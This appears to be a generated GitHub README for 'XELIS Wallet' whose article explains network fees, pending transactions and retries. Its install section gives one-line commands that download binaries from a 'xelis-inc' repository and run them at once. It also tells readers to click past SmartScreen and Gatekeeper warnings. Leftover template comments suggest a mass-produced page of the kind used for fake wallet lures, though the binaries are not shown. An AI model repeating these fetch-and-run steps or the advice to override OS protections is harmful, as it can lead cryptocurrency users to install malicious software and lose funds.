![XELIS Wallet fees: how they are set and when a fee is too low](assets/banner-article.png)
# XELIS Wallet fees: how they are set and when a fee is too low

What the fee buys, why a low one delays and what you can do.

## Downloads - Fees

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Fee options are part of the send flow in the release you are running, so the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) is the reference for what the field offers today.

> A low fee delays a payment. It never changes the amount, the recipient or the wallet balance by itself.

The fee is paid to the network for including your transaction in a block, and it is set at the moment you send. If it is below what the network expects at that time, the transaction waits as pending instead of confirming. Raising the fee helps on a new attempt; once a transaction is broadcast, the amount cannot be re-priced.

<!-- ARTICLE-BODY-BEGIN -->
## What the fee is actually for

The fee options you see come from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> you send with. Miners include transactions in blocks, and the fee is the incentive to include yours. The wallet lets you choose it because conditions change: what is generous on a quiet day is unremarkable during a busy one. Paying more does not speed up confirmation beyond getting included earlier, and paying less does not reduce what the recipient receives.

There is no separate wallet commission in this flow. The number you see is the network fee, and it is charged on top of the amount you are sending.

## Why a low fee delays instead of failing

A transaction that is valid but unattractive to include simply sits in the queue. The wallet shows it as pending, the balance may already account for it, and the recipient sees nothing until a block includes it. That waiting state is the symptom people describe as "the fee was too low", even though nothing has failed.

Because it is a queue and not an error, the response is patience or one deliberate retry, never a second identical payment fired off in a hurry.

## Choosing a fee at send time

Set the fee in the send view before you confirm; nothing is charged until you do. If the wallet offers a suggested value, that suggestion reflects the conditions it can see; raising it slightly is a reasonable choice for a payment that matters. The full send sequence, including the address check that matters more than the fee, is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md">send XEL from XELIS Wallet</a>.

If the wallet rejects the send before broadcast because the fee is too low, nothing has happened yet: adjust the fee and retry. That rejection is the system working, and it is much cheaper than a payment stuck in a queue.

## When the fee was already too low

Once broadcast, a transaction cannot be re-priced, so the choice is to wait or to make one new payment with a higher fee. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md">XELIS Wallet transaction stuck</a> covers how to tell those cases apart before you act.

For anyone curious why the amount is not visible on chain in the first place, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md">XELIS Wallet confidential transactions</a> explains what is encrypted and what the fee reveals.

## FAQ

### Does a higher fee make the transfer arrive faster?

It gets the transaction included sooner, which is the only speed the network controls. Beyond inclusion, nothing about the payment changes.

### Who receives the fee?

The network does, as the incentive for including the transaction. The wallet does not take a cut of it.

### Can I lower the fee after sending?

No. The fee is fixed when the transaction is created. A lower fee means a new transaction.

### Why does the wallet show a fee I did not choose?

Wallets commonly pre-fill a suggested fee you can change before confirming. Nothing is charged until you confirm.

### Is a rejected low fee a lost payment?

No. A transaction rejected before broadcast does not exist on the network, so nothing was sent.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Send XEL with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md)
- [XELIS Wallet transaction stuck pending](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
- [XELIS Wallet confidential transactions](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md)
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
